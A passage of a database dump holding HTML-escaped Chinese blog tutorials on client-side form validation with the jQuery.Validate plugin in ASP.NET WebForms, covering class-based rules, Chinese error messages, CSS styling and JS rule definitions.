type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</p>\r\n\r\n<p>小技巧：与一般的引用不同，我这边把脚本的路径采用Page.ResolveClientUrl进行获取，由于在一些项目开发中，不同模块的代码会分不同的目录来操作，而母版页一半是在网站的根目录所以为了保证所有页面的基本都可以引用到，所以需要将路径进行重新获取（不过这样做也有不好之处就是这样无法在后台的代码中动态为&lt;header&gt;添加东西，编译器会报错，解决办法是在&lt;header&gt;中放入一个literal控件，在后台代码里重新拼字符串赋给literal）。</p>\r\n\r\n<p>在引用完基本所需的脚本后就在母版页中添加脚本来进行验证。</p>\r\n\r\n<p>jQuery.Validate是监控form，在任何提交表单的操作前jQuery.Validate都会检测表单里的输入项是否满足规则，满足才允许提交。所以需</p>\r\n\r\n<p><br />\r\n要在jQuery(document).ready（）时为form进行验证注册</p>\r\n\r\n<p>具体代码如下:</p>\r\n\r\n<p>&lt;body&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:ContentPlaceHolder ID=&quot;ContentPlaceHolder1&quot; runat=&quot;server&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:ContentPlaceHolder&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/form&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;script type=&quot;text/javascript&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(document).ready(function() {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientID %&gt;&quot;).validate();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;&lt;/body&gt;</p>\r\n\r\n<p>到这边肯定会有人疑问了,为什么要把jQuery.Validate的代码写在页面的&lt;body&gt;中，这点牵扯到验证规则制定和分组验证的方法将会在中级篇和高级篇中讲解。</p>\r\n\r\n<p><br />\r\n注册完验证监控后我们就可以开始编写具体的验证代码了，我们通过母版页建立一个子页面，在页面里放几个基本的输入框代码如下：</p>\r\n\r\n<p>&lt;%@ Page Title=&quot;员工信息管理-初级验证&quot; Language=&quot;C#&quot; MasterPageFile=&quot;~/MasterPage.master&quot; AutoEventWireup=&quot;true&quot;<br />\r\n&nbsp;&nbsp;&nbsp; CodeFile=&quot;Base.aspx.cs&quot; Inherits=&quot;_Base&quot; %&gt;</p>\r\n\r\n<p>&lt;asp:Content ID=&quot;Content1&quot; ContentPlaceHolderID=&quot;head&quot; runat=&quot;Server&quot;&gt;<br />\r\n&lt;/asp:Content&gt;<br />\r\n&lt;asp:Content ID=&quot;Content2&quot; ContentPlaceHolderID=&quot;ContentPlaceHolder1&quot; runat=&quot;Server&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;table cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; border=&quot;1&quot; width=&quot;50%&quot; align=&quot;center&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用户名<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtUid&quot; runat=&quot;server&quot; CssClass=&quot;required&quot;&gt;&lt;/asp:TextBox&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 姓名<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtName&quot; runat=&quot;server&quot; CssClass=&quot;required&quot;&gt;&lt;/asp:TextBox&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 年龄<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;TextBox1&quot; runat=&quot;server&quot; CssClass=&quot;number&quot;&gt;&lt;/asp:TextBox&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 邮箱<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;TextBox2&quot; runat=&quot;server&quot; CssClass=&quot;email&quot;&gt;&lt;/asp:TextBox&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID=&quot;Button1&quot; runat=&quot;server&quot; Text=&quot;提交&quot; /&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/table&gt;<br />\r\n&lt;/asp:Content&gt;</p>\r\n\r\n<p>上面的代码中我已经完成了对用户名,姓名,年龄,邮箱的验证了，不知道你发现了没，就是在每个textbox中的class样式，其中 required表示必填，number表示必须是数字，email表示必须是电子邮件格式，如果写成required email表示这个字段必须填写同时必须是email格式。</p>\r\n\r\n<p><br />\r\n怎么样？是不是相当的简单，省去了拖控件，指定验证控件等啰嗦的代码，仅仅一个【样式名】就搞定了，当然jQuery.Validate还提供许多 验证方法，如日期，范围，最大值，最小值，整数，值比较等多种验证方式，同时你还可以自定义验证方式（当然这种自定义验证方式在初级篇不会将到，请期待中 级高级篇）。</p>\r\n\r\n<p><br />\r\n好了，我们点下提交按钮看下运行的效果：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725141455424453.jpg\" style=\"height:123px; width:494px\" /></p>\r\n\r\n<p>不错，果然验证成功了，但是有个问题，怎么提示信息全是英文的？</p>\r\n\r\n<p>我们查看下jQuery.Validate源代码，在236行果然有提示消息的定义方式，我们就可以进行修改这边的消息改成中文的方式，或者自定义了一个 中文的消息jQuery.Validate.message_cn.js，然后使用jQuery.extend来覆盖jQuery.Validate自身 的消息，代码如下：</p>\r\n\r\n<p>//定义中文消息<br />\r\nvar cnmsg = {<br />\r\n&nbsp;&nbsp;&nbsp; required: &quot;必选字段&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; remote: &quot;请修正该字段&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; email: &quot;请输入正确格式的电子邮件&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; url: &quot;请输入合法的网址&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; date: &quot;请输入合法的日期&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; dateISO: &quot;请输入合法的日期 (ISO).&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; number: &quot;请输入合法的数字&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; digits: &quot;只能输入整数&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; creditcard: &quot;请输入合法的信用卡号&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; equalTo: &quot;请再次输入相同的值&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; accept: &quot;请输入拥有合法后缀名的字符串&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; maxlength: jQuery.format(&quot;请输入一个长度最多是 {0} 的字符串&quot;),<br />\r\n&nbsp;&nbsp;&nbsp; minlength: jQuery.format(&quot;请输入一个长度最少是 {0} 的字符串&quot;),<br />\r\n&nbsp;&nbsp;&nbsp; rangelength: jQuery.format(&quot;请输入一个长度介于 {0} 和 {1} 之间的字符串&quot;),<br />\r\n&nbsp;&nbsp;&nbsp; range: jQuery.format(&quot;请输入一个介于 {0} 和 {1} 之间的值&quot;),<br />\r\n&nbsp;&nbsp;&nbsp; max: jQuery.format(&quot;请输入一个最大为 {0} 的值&quot;),<br />\r\n&nbsp;&nbsp;&nbsp; min: jQuery.format(&quot;请输入一个最小为 {0} 的值&quot;)<br />\r\n};<br />\r\njQuery.extend(jQuery.validator.messages, cnmsg);</p>\r\n\r\n<p>这样只需在母版页里引用下jQuery.Validate.message_cn.js就可以把原有的英文提示给替换掉了，2种方式都是可取的，如 果你想把jQuery.Validate改造成适合自己的验证控件就是用第1种方式直接改源代码，如果你只是想用些基本功能不想动原来的源代码就是用第2 种方法。</p>\r\n\r\n<p><br />\r\n然后我们重新刷新下页面，果然全变成中文了。看下效果：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725141528419866.jpg\" style=\"height:133px; width:580px\" /></p>\r\n\r\n<p>注意：这边错误提示消息的样式是可以自己定义的，我就修改了原有的样式，加上了个错误图标，更加好看点，样式定义如下：</p>\r\n\r\n<p>&lt;style type=&quot;text/css&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /************jQuery.Validate插件样式开始********************/<br />\r\n&nbsp;&nbsp;&nbsp; label.error<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; background: url(images/error.png) no-repeat 0px 0px;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; color: Red;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; padding-left: 20px;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input.error<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; border: dashed 1px red;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /************jQuery.Validate插件样式结束********************/<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/style&gt;</p>\r\n\r\n<p>到此，使用jQuery.Validate进行客户端验证的初级篇就写完了，具体的代码大家可以下载下面的源代码查看，敬请期待中级篇和高级篇。</p>\r\n\r\n<p><br />\r\nPS：1、代码中jquery.validate.js为官方版本，而jquery.validate1.js为我修改的版本，关于修改的内容在中级篇和高级篇我会讲到。</p>\r\n\r\n<p><br />\r\n2、jQuery.Validate仅能做客户端验证，并不能代替服务器端验证，为了系统的安全所以服务器端还是要进行验证的。</p>\r\n\r\n<p>转自:http://www.cnblogs.com/kyo-yo/archive/2010/06/28/Use-jQueryValidate-To-Validate-Client.html</p>\r\n',0,1437805009,0,0),(49,33,'使用jQuery.Validate进行客户端验证（中级篇-上）——不使用微软验证控件的理由','<p>在上一篇使用jQuery.Validate进行客户端验证（初级篇）中我介绍了为什么选用jQuery.Validate作为客户端的理由，同时也介绍了jQuery.Validate的基本用法以及中文验证消息的修改方法，今天的中级篇我将介绍下jQuery.Validate的一些常见的验证的使用方法。</p>\r\n\r\n<p><br />\r\njQuery.Validate为我们提供了3种验证编写方式，各有优缺点：</p>\r\n\r\n<p><br />\r\n1、在input对象中书写class样式指定验证规则或属性验证规则：</p>\r\n\r\n<p>如&lt;input type=&rdquo;text&rdquo; class=&rdquo;required&rdquo;/&gt;</p>\r\n\r\n<p>最简单、最便捷，提示消息使用jQuery.Validate的内置的消息（自定义扩展验证规则也属于此项），但是由于是以样式名的方式进行验证，导致了日后修改必须找到相应的input对象，同时无法使用高级验证规则，具体说明请向下看</p>\r\n\r\n<p><br />\r\n2、同第1条，这种验证规则方式也是在input对象中书写class样式，只不过书写的方式改为了JSON格式，但是这种方式提供了自定义验证消息的支持：</p>\r\n\r\n<p>如&lt;input type=&rdquo;text&rdquo; class=&quot;{required:true,minlength:5,,messages:{required:&#39;请输入内容&#39;}&rdquo;/&gt;</p>\r\n\r\n<p>简单、方便，但个人认为有点臃肿，还是和第1条一样和相对应的input对象纠缠在一起，并且还增加消息自定义，使得input对象变的更大了，干扰了页面代码的阅读，但可以使用高级验证规则（实际就是将第3种JS以JSON的格式放到具体的class中</p>\r\n\r\n<p><br />\r\n3、这种方式使用纯JS的方式：</p>\r\n\r\n<p>如：</p>\r\n\r\n<p><br />\r\n$().ready(function() {<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;#aspnetform&quot;).validate({<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rules: {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name: &quot;required&quot;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; email: {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; email: true<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; })</p>\r\n\r\n<p><br />\r\n})</p>\r\n\r\n<p>很好的解决了HTML和验证规则的分离，就是书写较为麻烦，需要单独写JS脚本，但好处是可以统一验证规范，将每个页面的验证规则都写在头部的脚本中，方便日后维护。</p>\r\n\r\n<p>注意：以上3种验证方式的消息如果未指定都会默认调用内置的消息</p>\r\n\r\n<p>在了解了jQuery.Validate为我们提供几种验证方式后，我们来具体分析下每个验证方式：</p>\r\n\r\n<p><br />\r\n第一种，在input对象中书写class样式指定验证规则或属性验证规则，可以将该input需要的规则一次性写在里面（具体见页面Middle-1.aspx）。</p>\r\n\r\n<p>如:&lt;asp:TextBox ID=&quot;txtAge&quot; runat=&quot;server&quot; class=&quot;required number&quot; max=&quot;99&quot; min=&quot;1&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>这段代码的意思是必须输入年龄字段，年龄必须是数字，同时必须在0-99范围内，使用起来很方便写几个属性就可以搞定，可以根据需求自由的组合验证规则。</p>\r\n\r\n<p><br />\r\n但是就如上面说的许多高级的验证规则无法使用:</p>\r\n\r\n<p><br />\r\nrange（范围验证，这个就可以替代max,min），</p>\r\n\r\n<p><br />\r\nrangeLength（长度范围验证，可以替代maxLength,minLength），</p>\r\n\r\n<p><br />\r\nequalTo（比较验证，这个其实可以用，但是如果使用使用的是ASP.NET控件就不行，纯HTML控件可以。</p>\r\n\r\n<p><br />\r\n看下代码，我想比较2次输入的密码是否一样时理论上可以这么写：</p>\r\n\r\n<p>&lt;asp:TextBox ID=&quot;txtRePwd&quot; runat=&quot;server&quot; TextMode=&quot;Password&quot; CssClass=&quot;required&quot; minlength=&quot;6&quot; equalTo=&#39;#&lt;%=txtPwd.ClientID %&gt;&#39;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>但是由于ASP.NET控件的机制问题，会把#&lt;%=txtPwd.ClientID %&gt;进行转译成#&amp;lt;%=txtPwd.ClientID %&gt;这样就导致了要比较的ID无法正确获取，导致验证不成功。</p>\r\n\r\n<p><br />\r\n但如果这么写就不会出现问题：</p>\r\n\r\n<p>&lt;input type=&rdquo;password&rdquo; class=&rdquo;required&rdquo; minlenght=&rdquo;6&rdquo; equalTo=&rdquo;txtPwd&rdquo;/&gt;</p>\r\n\r\n<p>第二种，同样书写class验证规则，只不过以JSON格式书写，可自定义验证消息，高级验证功能，JS验证规则的简化版（具体见页面Middle-2.aspx）：</p>\r\n\r\n<p>这种方式由于要以JSON的格式来编写规则，所以需要引用个单独的JS文件：jquery.metadata.js</p>\r\n\r\n<p>具体书写代码格式如下：</p>\r\n\r\n<p>&lt;asp:TextBox ID=&quot;txtUid&quot; runat=&quot;server&quot; CssClass=&quot;{required:true,messages:{required:&#39;不输入用户名你怎么登陆?&#39;}}&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&lt;asp:TextBox ID=&quot;txtPwd&quot; TextMode=&quot;Password&quot; runat=&quot;server&quot; CssClass=&quot;{required:true,minlength:6,messages:{required:&#39;你不输入密码怎么行 呢?&#39;,minlength:&#39;密码太短啦至少6位&#39;}}&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>具体意思分别是：必须输入用户名和必须输入密码同时长度至少6位。</p>\r\n\r\n<p>注意：这边我重新定义了验证信息，这样就不用使用原先在jQuery.Validate中的内置的通用消息，可以指定更加人性化的消息，看下截图（可以对比下内置提示信息和自定义提示信息）：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725141819571643.jpg\" style=\"height:145px; width:539px\" /></p>\r\n\r\n<p>使用了这种方式后，我们就可以使用第一种验证方式中无法使用的一些验证规则了，如range：</p>\r\n\r\n<p>&lt;asp:TextBox ID=&quot;txtAge&quot; runat=&quot;server&quot; class=&quot;{required:true,number:true,range:[1,99],messages:{range:&#39;您的年龄有问题 把,得在1-99岁之间哦&#39;}}&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>同样我这边也修改了具体具体的消息，而rangelength的用法也与这个类似我就不演示了。</p>\r\n\r\n<p>同样很遗憾的，由于ASP.NET控件特性问题equalTo在这也不能使用，HTML还是有效的。</p>\r\n\r\n<p>第三种，使用JS进行规则验证，可以使用所有验证规则，并且可以试HTML代码和验证规则很好的分离，方便日后维护（具体代码见Middle-3.aspx）</p>\r\n\r\n<p>这种方式需要手写JS来编写验证的规则，具体的格式如下：</p>\r\n\r\n<p>function InitRules() {<br />\r\n&nbsp;&nbsp;&nbsp; opts = {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rules:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtUid.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtPwd.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; minlength: 6<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtRePwd.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; minlength: 6,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; equalTo:&quot;#&lt;%=txtPwd.ClientID %&gt;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtName.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtAge.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; number: true,<br 